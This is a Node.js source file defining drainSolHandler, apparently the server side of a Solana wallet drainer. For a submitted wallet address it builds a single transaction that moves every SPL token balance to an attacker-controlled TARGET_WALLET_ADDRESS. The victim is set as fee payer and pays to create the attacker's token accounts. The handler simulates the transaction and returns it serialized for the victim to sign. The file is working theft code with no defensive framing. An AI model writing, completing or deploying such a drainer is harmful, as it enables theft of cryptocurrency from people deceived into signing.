const { 
    Connection, 
    PublicKey, 
    TransactionMessage, 
    VersionedTransaction, 
    ComputeBudgetProgram,
    SystemProgram
} = require('@solana/web3.js');
const { 
    getAssociatedTokenAddress, 
    createAssociatedTokenAccountInstruction,
    createTransferInstruction,
    getMint
} = require('@solana/spl-token');

// Assuming 'connection' is initialized globally or passed in
// const connection = new Connection(process.env.SOLANA_RPC_URL, 'confirmed');

async function drainSolHandler(req, res) {
    try {
        const { walletAddress } = req.body;
        if (!walletAddress) {
            return res.status(400).json({ error: "Missing walletAddress" });
        }

        const sourcePubkey = new PublicKey(walletAddress);
        const targetPubkey = new PublicKey(process.env.TARGET_WALLET_ADDRESS);

        // 1. Fetch all SPL Token Accounts for the source wallet
        const tokenAccountsInfo = await connection.getParsedTokenAccountsByOwner(
            sourcePubkey,
            { programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623Vq5Fn') }
        );

        if (tokenAccountsInfo.value.length === 0) {
            return res.status(400).json({ 
                error: "No tokens found", 
                transaction: null, 
                amount: 0, 
                tokenSymbol: "SOL" 
            });
        }

        const instructions = [];
        let aggregateCUAllocation = 0;
        
        const results = []; 

        for (const accountInfo of tokenAccountsInfo.value) {
            const parsedData = accountInfo.account.data.parsed.info;
            const mintAddressStr = parsedData.mint;
            const sourceAta = new PublicKey(accountInfo.pubkey);
            
            // Get Mint Metadata for Symbol/Decimals
            let symbol = "TOKEN";
            let decimals = 0;
            try {
                const mintInfo = await getMint(connection, new PublicKey(mintAddressStr));
                decimals = mintInfo.decimals;
                if (mintAddressStr === process.env.USDC_MINT) symbol = "USDC";
                else if (mintAddressStr === process.env.USDT_MINT) symbol = "USDT";
                else if (mintAddressStr === process.env.WSOL_MINT) symbol = "WSOL";
                else symbol = `Token-${mintAddressStr.slice(0,4)}...`;
            } catch (e) {
                console.warn(`Could not fetch mint info for ${mintAddressStr}`);
            }

            const balance = parseFloat(parsedData.tokenAmount.uiAmountString);
            
            const destATA = await getAssociatedTokenAddress(
                new PublicKey(mintAddressStr),
                targetPubkey,
                false
            );

            const destAccountState = await connection.getAccountInfo(destATA);
            if (!destAccountState) {
                instructions.push(
                    createAssociatedTokenAccountInstruction(
                        sourcePubkey,
                        destATA,
                        targetPubkey,
                        new PublicKey(mintAddressStr)
                    )
                );
                aggregateCUAllocation += 32000;
            }

            instructions.push(
                createTransferInstruction(
                    new PublicKey(mintAddressStr),
                    sourceAta,
                    destATA,
                    sourcePubkey,
                    [],
                    Math.floor(balance * Math.pow(10, decimals))
                )
            );
            aggregateCUAllocation += 16000;

            results.push({
                tokenSymbol: symbol,
                amount: parsedData.tokenAmount.uiAmount,
                mintAddress: mintAddressStr
            });
        }

        if (instructions.length === 0) {
             return res.json({
                 transaction: null,
                 amount: 0,
                 tokenSymbol: "NONE"
             });
        }

        // Add Compute Budget Instructions
        const priorityFee = 100000; 
        instructions.unshift(
            ComputeBudgetProgram.setComputeUnitPrice({ microLamports: priorityFee })
        );
        instructions.unshift(
            ComputeBudgetProgram.setComputeUnitLimit({ units: aggregateCUAllocation })
        );

        // Build Versioned Transaction
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
        
        const message = new TransactionMessage({
            payerKey: sourcePubkey,
            recentBlockhash: blockhash,
            instructions: instructions
        }).compileToV0Message();

        const vTransaction = new VersionedTransaction(message);

        // STRICT SIMULATION: Enforce success
        const simResult = await connection.simulateTransaction(vTransaction, {
            commitment: 'confirmed'
        });
        
        if (simResult.value.err) {
            throw new Error(`Simulation Failed: ${JSON.stringify(simResult.value.err)}`);
        }

        // Serialize Payload
        const payloadBase64 = Buffer.from(vTransaction.serialize()).toString('base64');

        const primaryResult = results[0] || { tokenSymbol: "UNKNOWN", amount: 0 };

        return res.json({
            transaction: payloadBase64,
            amount: primaryResult.amount,
            tokenSymbol: primaryResult.tokenSymbol,
            blockhash: blockhash,          // Fixed key name
            lastValidBlockHeight: lastValidBlockHeight, // Fixed key name
            simulated: true,
            details: results
        });

    } catch (err) {
        console.error("Drain Handler Error:", err);
        return res.status(500).json({
            error: "Pipeline processing halted",
            details: err.message
        });
    }
}

module.exports = { drainSolHandler };